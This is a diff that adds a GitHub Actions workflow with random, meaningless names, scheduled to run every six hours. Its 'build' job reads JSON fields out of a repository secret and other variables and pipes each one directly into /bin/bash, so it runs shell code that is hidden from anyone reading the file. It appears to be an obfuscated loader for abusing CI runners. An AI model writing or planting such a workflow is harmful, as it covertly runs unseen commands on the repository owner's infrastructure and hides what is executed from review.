@@ -1,0 +1,22 @@
+name: kedalu6742
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kedalu6742
+        env:
+          vyfty1: ${{ secrets.vyfty1 }}
+        run: |
+          echo $vyfty1 | jq -r .dxvp562 | /bin/bash
+          echo $d2823 | jq -r .mszu44 | /bin/bash
+          echo $q7 | jq -r .xjhd68533 | /bin/bash
+          echo $rhhis8 | jq -r .ke16211 | /bin/bash
+          echo $thcon168 | jq -r .wstl271 | /bin/bash
+          echo $h7 | jq -r .qtlw02 | /bin/bash
+
